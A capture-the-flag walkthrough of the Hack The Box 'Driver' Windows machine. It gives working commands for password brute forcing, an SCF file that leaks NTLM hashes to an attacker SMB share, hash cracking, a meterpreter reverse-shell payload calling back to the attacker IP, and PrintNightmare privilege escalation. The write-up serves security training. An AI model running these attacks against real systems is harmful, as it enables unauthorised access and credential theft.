# Hackthebox Driver - Windows

## Nmap

```
┌──(root💀kali)-[~]
└─# nmap -T5 -sC -sV -O -p- 10.10.11.106    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-30 19:37 EDT
Nmap scan report for 10.10.11.106
Host is up (0.026s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE      VERSION
80/tcp   open  http         Microsoft IIS httpd 10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Potentially risky methods: TRACE
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2008 R2 (91%), Microsoft Windows 10 1511 - 1607 (87%), Microsoft Windows Phone 7.5 or 8.0 (86%), Microsoft Windows 10 1607 (85%), Microsoft Windows 10 1511 (85%), Microsoft Windows 7 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2008 R2 or Windows 8.1 (85%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (85%), Microsoft Windows Server 2008 SP1 or Windows Server 2008 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-05-01T06:46:14
|_  start_date: 2022-05-01T06:42:07
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 7h07m35s, deviation: 0s, median: 7h07m34s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.54 seconds
```

## Port 80

### Inspecting with burp

The response header when trying to authenticate gives this (we can also see it in the nmap scan):
```
WWW-Authenticate: Basic realm="MFP Firmware Update Center. Please enter password for admin"
```
So we get username, we can try to bruteforce with hydra `hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.106 http-get`
```
┌──(root💀kali)-[~]
└─# hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.11.106 http-get                                                                                                                                                           255 ⨯
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-30 19:55:19
[WARNING] You must supply the web page as an additional option or via -m, default path set to /
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-get://10.10.11.106:80/
[STATUS] 6124.00 tries/min, 6124 tries in 00:01h, 14338275 to do in 39:02h, 16 active
[STATUS] 6045.00 tries/min, 18135 tries in 00:03h, 14326264 to do in 39:30h, 16 active
[80][http-get] host: 10.10.11.106   login: admin   password: admin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-04-30 19:58:36
```
- So we have admin:admin credentials

There is a file upload functionality and it says it will go in the share. It bugged me for a while and then I remember the URL File attack
So I uploaded this file
```
[Shell]
Command=2
IconFile=\\10.10.14.2\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
- I named it with and @ at the begining for instance `@csbygb`
- And then we need to launch responder with smb server on obviously `responder -w --lm -v -I tun0`
- And we get hashes!  
![image](https://user-images.githubusercontent.com/96747355/166127479-62d92e82-0ce3-4bc5-ba8a-429e1b42359a.png)  
- Now we just have to crack one of them with hashcat
- We just need to copy a whole one like this `tony::DRIVER:a05acd47ab1ac310:B15097FF39CD452C8F8E53BDC33B7B37:0101000000000000DF515CFA2F5DD801D1688BA244C5025400000000020000000000000000000000`
- And then launch hashcat as follow `hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt`
- And we get the password `liltony`  
![image](https://user-images.githubusercontent.com/96747355/166127617-791920c3-cccd-4c58-b619-ff2e1515cea7.png)  
- Let's see what shares we have
```
┌──(root💀kali)-[~/Documents/hackthebox/driver]
└─# smbclient -L //10.10.11.106 -U 'tony'                                                                                                                                                                                                1 ⨯
Enter WORKGROUP\tony's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.106 failed (Error NT_STATUS_IO_TIMEOUT)
Unable to connect with SMB1 -- no workgroup available
```
- Let's use cracmapexec to see how we could use the creds  
![image](https://user-images.githubusercontent.com/96747355/166128322-f37c77a4-be30-4be1-8291-568e5243a846.png)  
- Let's get a shell with evil-winrm `evil-winrm -i 10.10.11.106 -u tony -p liltony`
- It works! Let's grab our user flag in tony's desktop!

## Privesc

- Let's get winpeas and execute it in our target
- In our kali `wget https://github.com/carlospolop/PEASS-ng/releases/download/20220424/winPEASx64.exe`
- Now we just have to upload it in our target with evilwinrm it really easy we just need to type `upload winPEASx64.exe`
- And we launch it `.\winPEASx64.exe`
- Winpeas shows that there is a powershell history file  
![image](https://user-images.githubusercontent.com/96747355/166128680-3edae579-a4c4-49c1-a595-07f5e3770547.png)  
- If we google the specific driver we have a privesc vuln
- Let's get a shell with msfconsole so that we can privesc using a metasploit module
- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.2 LPORT=4444 -f exe -o reverse2.exe`
- in our evvilwinrm shell `upload reverse.exe`
- I got annoyed with this exploit because I could not make it work
- I decided to use [printnightmare](../windows/printNightmare.md) instead
  - `wget https://raw.githubusercontent.com/calebstewart/CVE-2021-1675/main/CVE-2021-1675.ps1`
  - From evil winrm `upload CVE-2021-1675.ps1`
  - `Import-Module .\CVE-2021-1675.ps1`
  - `Get-Command Invoke-Nightmare`
  - `Invoke-Nightmare -NewUser "csbygb" -NewPassword "csbygb123!"`
  - Finally if we net user we see we are in the admin group `net user csbygb`
  - Now we just need to use evil-winrm with our new user `evil-winrm -i 10.10.11.106 -u csbygb -p csbygb123!`
  - And we can grab the admin flag 
  - `cd C:\Users\Administrator\Desktop`
  - `type root.txt`
